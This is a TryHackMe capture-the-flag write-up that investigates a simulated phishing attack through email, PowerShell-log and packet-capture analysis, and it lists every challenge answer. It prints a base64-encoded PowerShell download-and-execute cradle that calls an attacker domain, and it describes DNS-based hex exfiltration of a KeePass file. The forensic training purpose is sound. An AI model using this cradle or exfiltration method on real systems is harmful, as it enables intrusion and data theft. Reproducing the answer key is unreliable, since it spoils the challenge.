# Phishing Analysis

## **Boogeyman 1 CTF**

## TryHackMe (Challenge)

### Tools Used: Evtx2json, **Thunderbird, LNKParse3, Wireshark, Tshark, jq**

### Scenario

An investigation has been initiated following the detection of a suspected phishing attack targeting a user named Julianne. Initial indicators suggest that a malicious email led to PowerShell execution and suspicious network communication, indicating the presence of a new and emerging threat.

## Alert: Emerging Phishing-Led Attack Detected

## Email Analysis

The Emails that is received by the targeted user 
<img width="882" height="346" alt="Screenshot 2026-01-11 223607" src="https://github.com/user-attachments/assets/8c3a3a01-7598-4253-a93c-05b6381d11d2" />


### Challenge Questions

1.What is the email address used to send the phishing email?

Opened the dump.eml file using the Thunderbird app 
<img width="960" height="347" alt="Screenshot 2026-01-11 224901" src="https://github.com/user-attachments/assets/d11b8527-8247-4349-b104-0d66fa2f0e6b" />


Answer: agriffin@bpakcaging.xyz

2.What is the email address of the victim?

<img width="960" height="386" alt="Screenshot 2026-01-11 225020" src="https://github.com/user-attachments/assets/9af23718-220d-413a-9220-a843c9acc09c" />

Answer: julianne.westcott@hotmail.com

3.What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?
To view the DKIM signature, click View source in right side top corner 
<img width="589" height="390" alt="Screenshot 2026-01-11 225647" src="https://github.com/user-attachments/assets/3b01e9bf-a6d6-47fa-8b20-c9d4dd69b62c" />


Answer: elasticemail

4.What is the name of the file inside the encrypted attachment?
The email contains an invoice.zip inside that there is Invoice_20230103.lnk where locked 

Answer:Invoice_20230103.lnk

5.What is the password of the encrypted attachment?

In that email itself there is a password to unlock it 
Answer: Invoice2023!

6.Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

We have to use Lnkparse tool see what is inside the file

<img width="960" height="406" alt="Screenshot 2026-01-11 231919" src="https://github.com/user-attachments/assets/22e80299-35d6-4cc6-a702-e04e6504f300" />

<img width="960" height="337" alt="Screenshot 2026-01-11 232140" src="https://github.com/user-attachments/assets/3150fe26-e7fa-44d8-a683-7220d686d765" />

Answer:

```json
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGU
AbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8
AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

## Endpoint Security

### Challenge Questions

1.What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order. (e.g. a.domain.com,b.domain.com).

We have to use jq tool for this investigation cause the given file is in powershell.json format.

The filter used: cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}' |sort | uniq 

<img width="960" height="389" alt="Screenshot 2026-01-12 083238" src="https://github.com/user-attachments/assets/1b1119f1-8c33-4085-9d31-e1ace1eb7123" />

Answer: cdn.bpakcaging.xyz,files.bpakcaging.xyz

2.What is the name of the enumeration tool downloaded by the attacker?

<img width="936" height="306" alt="Screenshot 2026-01-12 084148" src="https://github.com/user-attachments/assets/a4e461ad-8e58-484a-acc1-142f91c94c96" />

Answer: Seatbelt

3.What is the file accessed by the attacker using the downloaded **sq3.exe** binary? Provide the full file path with escaped backslashes.

<img width="960" height="121" alt="Screenshot 2026-01-12 084858" src="https://github.com/user-attachments/assets/f34db11c-4a9f-481c-8d1c-6be2b4b293e1" />

Answer: C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite

4.What is the software that uses the file in Q3?

cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}' |grep "q3"|sort | uniq
<img width="959" height="139" alt="Screenshot 2026-01-12 085211" src="https://github.com/user-attachments/assets/e9de893b-b1b6-4d9d-94e6-37c3d95c1391" />


Answer: Microsoft sticky notes

5,What is the name of the exfiltrated file?
<img width="960" height="366" alt="Screenshot 2026-01-12 085513" src="https://github.com/user-attachments/assets/3322dca0-1c73-432f-9f8c-ebca242563e3" />


Answer: protected_data.kdbx

6.What type of file uses the .kdbx file extension?

<img width="735" height="319" alt="Screenshot 2026-01-12 085720" src="https://github.com/user-attachments/assets/b01efc7b-7a45-4e1d-bd5d-b27e4cd10173" />

Answer: Keepass

7.What is the encoding used during the exfiltration attempt of the sensitive file?
<img width="949" height="303" alt="Screenshot 2026-01-12 090020" src="https://github.com/user-attachments/assets/8431557e-af14-412f-96a6-529e8b54aeb1" />


Answer: hex

8.What is the tool used for exfiltration?

<img width="960" height="301" alt="Screenshot 2026-01-12 090222" src="https://github.com/user-attachments/assets/3e8750fd-2693-4b0e-bcb1-1263eb02a0ed" />

Answer: nslookup

## Network Traffic Analysis

### Challenge Questions

1.What software is used by the attacker to host its presumed file/payload server?

Now we are moving into network investigation “capture.pcapng” file. During investiagtion of powershell.json file we know the attacker ip is  167.71.211.113. sort it by length 

<img width="960" height="406" alt="Screenshot 2026-01-12 091504" src="https://github.com/user-attachments/assets/27dfc239-d542-4bef-a7aa-bd89a5d222ae" />

Answer: Python

2.What HTTP method is used by the C2 for the output of the commands executed by the attacker?

<img width="960" height="384" alt="Screenshot 2026-01-12 092122" src="https://github.com/user-attachments/assets/12349368-abff-46f6-8890-ac5a44ab1c10" />

Answer: POST

3.What is the protocol used during the exfiltration activity?

Answer: dns

4.What is the password of the exfiltrated file?
The http method is POST during the C2 connection, so we only look of the http.request.method=”post” in the wireshark, after a little bit time you will find a frame with number 44467 have the below hex format encode.

<img width="533" height="438" alt="Screenshot 2026-01-12 094713" src="https://github.com/user-attachments/assets/857d6852-f390-44ec-b83d-ac8e1ce730a1" />

Answer:%p9^3!lL^Mz47E2GaT^y

5.What is the credit card number stored inside the exfiltrated file?

```json
Hint
Retrieve the exfiltrated file first using Tshark and focus on 
the query type used shown in the PowerShell logs.
```

We use Tshark tool and filter it → tshark -r capture.pcapng -n -T fields -e dns.qry.name | grep “bpakcaging.xyz” | cut -f 1 -d “.” | uniq -c . or tshark -r capture.pcapng -n -T fields -e dns.qry.name

<img width="487" height="366" alt="Screenshot 2026-01-12 115743" src="https://github.com/user-attachments/assets/acad7d34-405f-44d0-a6db-2c52a6cff435" />

using cyberchef to output as a .kdbx after decode form hex. Used keepass to open the downloaded file. It asked password where we already got it in investigation “ %p9^3!lL^Mz47E2GaT^y “

<img width="643" height="451" alt="Screenshot 2026-01-12 120233" src="https://github.com/user-attachments/assets/429aeb29-83b5-49a3-a0ad-4abf40ccfe05" />

Answer: 4024007128269551

### Done By Ruthran-sec
